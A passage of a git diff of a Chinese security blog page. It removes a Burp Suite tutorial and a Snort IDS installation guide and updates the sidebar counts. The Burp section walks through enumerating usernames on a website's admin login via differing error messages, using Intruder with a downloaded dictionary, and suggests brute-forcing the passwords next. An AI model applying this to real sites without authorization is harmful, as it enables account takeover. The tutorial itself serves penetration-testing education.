-<li>8.Decoder（解码器）——是一个进行手动执行或对应用程序数据者智能解码编码的工具。</li>
-<li>9.Comparer（对比）——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</li>
-<li>10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</li>
-<li>11.Options(设置)——对Burp Suite的一些设置  </li>
-</ul>
-<p>我们这里主要来讲解一下其中的主要几个功能。</p>
-<h2 id="0x02-代理功能"><a href="#0x02-代理功能" class="headerlink" title="0x02 代理功能"></a>0x02 代理功能</h2><p>首先是代理功能（Proxy），我们打开BurpSuite，点击进入到Proxy选项，<br>然后进入Options选项，我们可以看到默认的代理地址是127.0.0.1:8080，我们可以启用它，也可以自己add一个新的代理，比如我们输入127.0.0.1:8082。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp01.png" alt=""></p>
-<p>然后在要使用的代理前面打勾。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp02.png" alt=""></p>
-<p>然后在自己的浏览器中，将代理设置的与上面我们勾选的代理相同。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp03.png" alt=""></p>
-<p>接下来打开Proxy功能中的Intercept选项卡，拦截功能为“Interception is on”状态则表示打开拦截，需要关闭时点击使它变成“Interception is off”状态即可。<br>在raw选项中可以看到web请求的请求地址、http协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等。可以通过手工修改这些信息，对服务器端进行渗透测试。  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp04.png" alt=""></p>
-<p>Forward可以让请求进行到下一步，history选项框可以看到之前的请求。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp05.png" alt=""></p>
-<h2 id="0x03-重放功能"><a href="#0x03-重放功能" class="headerlink" title="0x03 重放功能"></a>0x03 重放功能</h2><p>接下来我们介绍一下中继器（Repeater），我们在刚才捕捉到的请求中，点击右键-Send to Repeater，就可以看到Repeater按钮变色，然后我们点到这个选项中，就会发现Request中已经写入刚才我们send的请求。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp06.png" alt=""></p>
-<p>我们可以在这里进行编辑重发，点击go，就可以在右边窗口可以看到响应。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp07.jpg" alt=""></p>
-<p>在这里进行一些手工注入的测试是十分方便的。</p>
-<h2 id="0x04-爆破功能"><a href="#0x04-爆破功能" class="headerlink" title="0x04 爆破功能"></a>0x04 爆破功能</h2><p>接下来介绍一下爆破功能（Intruder），这里以一个网站的后台为例。<br>这个后台的设计有个缺陷，就是如果登陆的时候，我们随意输入密码，然后用户名存在，就会提示权限不足，用户名不存在，就会显示输入的用户名或密码错误。  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp08.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp09.png" alt=""></p>
-<p>这里我们先用之前的代理功能，截断一次手动发送的请求。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp10.png" alt=""></p>
-<p>然后右键Send to Intruder，这时可以在Intruder的Positions选项中看到刚才的web请求。  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp11.png" alt=""></p>
-<p>这里我们可以看到，所有能别提交的值都被加深了颜色，但是我们根据刚才的思路，应该是要爆破用户名，根据响应来判断用户名存在与否。所以我们先点击右侧的clear将所有加深的参数取消掉，然后手动圈选用户名部分我们提交的参数，点击右侧的add，仅将它选中。  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp12.jpg" alt=""></p>
-<p>在options选项中我们可以设置线程数和延时等一些设定，这次我们先保持默认。  </p>
-<p>我们进入Payloads选项，在Payload Options中load一个账号字典文件进去，如果没有现有的字典文件，可以在 <a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a> 下载。  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp13.png" alt=""></p>
-<p>然后我们点击start attack按钮，可以看到测试速度要比自己手写脚本爆破快一些（但是如果你是社区版的burpsuite就会十分慢，会仅让你体验这个功能）</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp14.png" alt=""></p>
-<p>等待字典文件跑完，我们可以点击lentgh，使它以响应的长度排序，就可以区分“权限不足”和“用户名和密码错误”的账号了，可以看到，这个小字典一共爆出了3个账号，这个时候我们可以用同样的办法，让密码变化，用密码字典来爆破这几个账号的密码。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/burpsuite/bp15.png" alt=""></p>
-<h2 id="0x05-未完待续"><a href="#0x05-未完待续" class="headerlink" title="0x05 未完待续"></a>0x05 未完待续</h2><p>Burpsuite是一个非常非常好用的工具，由于篇幅问题这里暂时只介绍这几种常用的功能。下次有时间可以写一下爬虫部分和验证码处理插件。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/17/ubuntu16.04安装snort/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/03/17/ubuntu16.04安装snort/" itemprop="url">
-                  ubuntu16.04安装snort
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-17T22:04:45+08:00">
-                2018-03-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络安全/" itemprop="url" rel="index">
-                    <span itemprop="name">网络安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/03/17/ubuntu16.04安装snort/" class="leancloud_visitors" data-flag-title="ubuntu16.04安装snort">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-snort是什么？"><a href="#0x00-snort是什么？" class="headerlink" title="0x00 snort是什么？"></a>0x00 snort是什么？</h2><p>snort是一款开源的入侵检测系统，由Marty Roesch先生用C语言开发，直至今天，Snort已发展成为一个多平台(Multi-Platform),实时(Real-Time)流量分析，网络IP数据包(Pocket)记录等特性的强大的网络入侵检测/防御系统。  </p>
-<h2 id="0x01-snort安装"><a href="#0x01-snort安装" class="headerlink" title="0x01 snort安装"></a>0x01 snort安装</h2><p>这里主要讲ubuntu下通过编译源码的安装方法  </p>
-<p>首先，我们在snort官方 <a href="http://www.snort.org" target="_blank" rel="noopener">www.snort.org</a> 下查看最新版本的源码。  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/snort/snort01.png" alt=""></p>
-<p>然后在terminal中输入如下指令获取daq源码包和snort源码包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.snort.org/downloads/snort/daq-2.0.6.tar.gz</span><br><span class="line">wget https://www.snort.org/downloads/snort/snort-2.9.11.1.tar.gz</span><br></pre></td></tr></table></figure></p>
-<p>接着解压源码包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xvzf daq-2.0.6.tar.gz</span><br><span class="line">tar xvzf snort-2.9.11.1.tar.gz</span><br></pre></td></tr></table></figure></p>
-<p>然后我们安装一下daq所依赖的一些开发包，否则直接编译安装会出现flex、bison和libpcap错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install flex</span><br><span class="line">sudo apt-get install bison</span><br><span class="line">sudo apt-get install libpcap-dev</span><br></pre></td></tr></table></figure></p>
-<p>然后先进入解压后daq的路径，进行编译安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd daq-2.0.6</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/snort/snort02.jpg" alt=""></p>
-<p>结果如下没有报错说明我们安装完成。  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/snort/snort03.jpg" alt=""></p>
-<p>接着我们要安装一下snort所依赖的一些开发包，否则配置脚本会由于缺少libpcre-dev、libdumbnet-dev 和zlib开发库而报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libpcre3-dev</span><br><span class="line">sudo apt-get install libdumbnet-dev</span><br><span class="line">sudo apt-get install zlib1g-dev</span><br></pre></td></tr></table></figure></p>
-<p>然后我们在local创建一个目录,再进入刚才解压的snort目录中，编译安装snort<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/local/snort</span><br><span class="line">./configure --prefix=/usr/local/snort/ --enable-sourcefire &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
-<p>结果如下没有报错说明我们安装完成。  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/snort/snort04.jpg" alt=""></p>
-<p>然后我们进入刚才创建的目录，并进入它的子目录bin来运行snort<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/snort/bin</span><br><span class="line">./snort</span><br></pre></td></tr></table></figure></p>
-<p>我们可以看到它处在promisc模式（包转储模式）。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/snort/snort05.jpg" alt=""></p>
-<p>至此，我们snort安装完成。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2389,7 +2444,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">115</span>
+                <span class="site-state-item-count">120</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2411,7 +2466,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">68</span>
+                <span class="site-state-item-count">72</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2453,7 +2508,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
